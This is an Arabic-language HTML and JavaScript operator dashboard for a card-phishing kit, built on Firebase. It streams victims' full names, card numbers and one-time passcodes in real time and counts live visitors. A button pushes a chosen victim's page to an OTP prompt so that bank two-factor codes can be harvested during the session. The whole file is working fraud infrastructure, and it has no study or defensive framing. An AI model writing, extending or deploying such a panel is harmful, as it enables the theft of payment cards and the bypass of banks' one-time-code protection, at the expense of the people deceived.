<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Control Panel - Engineer Hasan</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 20px; }
        .header { background: #1a1a1a; padding: 15px; border-bottom: 2px solid #006C35; display: flex; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .card { background: #1e1e1e; border: 1px solid #333; margin-bottom: 10px; padding: 15px; border-radius: 8px; display: grid; grid-template-columns: 1fr 1.5fr 1fr 1fr; gap: 10px; align-items: center; border-right: 5px solid #006C35; }
        .card-no { color: #ff4d4d; font-family: monospace; font-size: 18px; font-weight: bold; }
        .otp-val { color: #00aaff; font-size: 22px; font-weight: bold; }
        .btn { padding: 8px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn-otp { background: #006C35; color: white; }
        .btn-del { background: #444; color: white; }
        #l-scr { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .p-in { padding: 10px; background: #111; border: 1px solid #006C35; color: #00ff88; text-align: center; font-size: 20px; }
    </style>
</head>
<body>

<div id="l-scr">
    <h2 style="color: #006C35">ENGINEER HASAN PANEL</h2>
    <input type="password" class="p-in" placeholder="PASSWORD" oninput="if(this.value==='H1234567890H')document.getElementById('l-scr').remove()">
</div>

<div class="header">
    <div>نشط الآن: <span id="online-count" style="color: #00ff88">0</span></div>
    <div id="status">جاري المراقبة اللحظية...</div>
</div>

<div id="logs-container" style="margin-top: 20px;"></div>

<script>
    // بيانات الفايربيس اللي في صفحاتك (System-Cloud-V3)
    const firebaseConfig = {
        apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
        authDomain: "system-cloud-v3.firebaseapp.com",
        databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com",
        projectId: "system-cloud-v3",
        storageBucket: "system-cloud-v3.firebasestorage.app",
        messagingSenderId: "48216753818",
        appId: "1:48216753818:web:ef537a31f36a08dffc4123"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const container = document.getElementById('logs-container');

    // وظيفة رسم البيانات - معدلة لتكون خفيفة جداً
    function updateUI(id, data) {
        let card = document.getElementById('card-' + id);
        const user = data.personal_info || {};
        const bank = data.card_details || {};

        const html = `
            <div>
                <strong>الاسم:</strong> ${user.fullName || '---'}<br>
                <small style="color: #888;">${data.current_page || 'Home'}</small>
            </div>
            <div class="card-no">${bank.cardNumber || '**** **** **** ****'}</div>
            <div class="otp-val">OTP: ${bank.otp || '----'}</div>
            <div style="display: flex; flex-direction: column; gap: 5px;">
                <button class="btn btn-otp" onclick="sendCmd('${id}', 'go_to_otp')">طلب OTP</button>
                <button class="btn btn-del" onclick="deleteRec('${id}')">حذف</button>
            </div>
        `;

        if (card) {
            card.innerHTML = html;
        } else {
            card = document.createElement('div');
            card.id = 'card-' + id;
            card.className = 'card';
            card.innerHTML = html;
            container.insertBefore(card, container.firstChild);
        }
    }

    // مراقبة الإضافات والتعديلات فقط (بدون تحميل كامل القاعدة)
    db.ref('orders').on('child_added', (s) => updateUI(s.key, s.val()));
    db.ref('orders').on('child_changed', (s) => updateUI(s.key, s.val()));
    db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());

    function sendCmd(id, step) {
        db.ref('orders/' + id).update({ next_step: step, last_action: Date.now() });
    }

    function deleteRec(id) {
        if(confirm('حذف؟')) db.ref('orders/' + id).remove();
    }

    // عداد الزوار
    db.ref('live_sessions').on('value', (s) => {
        let c = 0; s.forEach(x => { if(Date.now() - x.val().last_seen < 20000) c++; });
        document.getElementById('online-count').innerText = c;
    });
</script>
</body>
</html>
